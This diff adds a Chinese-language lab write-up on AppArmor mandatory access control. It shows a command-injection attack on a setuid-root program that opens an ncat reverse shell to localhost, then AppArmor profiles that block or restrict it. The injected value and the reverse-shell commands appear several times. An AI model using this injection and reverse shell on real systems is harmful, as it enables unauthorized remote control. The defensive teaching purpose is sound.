@@ -1,0 +1,39 @@
+AppArmor是linux系统中提供的一种强制访问控制方法，与SELinux类似，AppArmor 通过提供强制访问控制(MAC) 来补充传统的Linux自主访问控制(DAC) 。AppArmor允许系统管理员通过为每个程序进行权限配置，来限制程序的功能。配置文件可以允许诸如网络访问、原始套接字访问以及在匹配路径上读取、写入或执行文件的权限等功能。本实验的学习目标是让学生根据不同程序的访问控制需求，使用AppArmor进行访问控制配置，理解最小特权原则，并了解如何通过该方法抵御攻击。
+
+修改/etc/apparmor.d/bin.ping文件
+
+sudo vi /etc/apparmor.d/bin.ping
+
+(1) 编译下图的程序，设置setuidroot权限；通过命令注入攻击，创建reverseshell。
+sudo chown root inj
+sudo chmod 4755 inj
+
+ncat -lvp 5555
+./inj " readme.txt;ncat 127.0.0.1 5555 -e /bin/bash"
+
+桌面
+(2) 使用apparmor对该程序进行访问控制，禁止attacker通过命令注入创建reverseshell；
+为了禁止reverseshell，我们直接禁用ncat即可
+sudo chown root command
+sudo chmod 4755 command
+aa-genprof command
+
+sudo apt-get install apparmor-utils
+sudo /etc/init.d/apparmor start
+
+sudo vi home.seed.lab3.command
+
+ncat -lvp 5555
+./command " readme.txt;ncat 127.0.0.1 5555 -e /bin/bash"
+
+(3) 使用apparmor对该程序进行访问控制，允许attacker通过命令注入创建reverseshell，但将attacker在reverseshell中的能使用的命令限制为ls,whoami；
+要允许命令注入，就是要允许ncat执行。经过实验发现apparmor的profile规则匹配应该是默认拒绝的，所以我们限制命令为ls和whoami就直接允许这两个命令即可。需要注意的是，/bin/bash的权限也一定要给
+
+sudo vi home.seed.lab3.command
+systemctl restart apparmor
+
+ncat -lvp 5555
+./command " readme.txt;ncat 127.0.0.1 5555 -e /bin/bash"
+
+
+
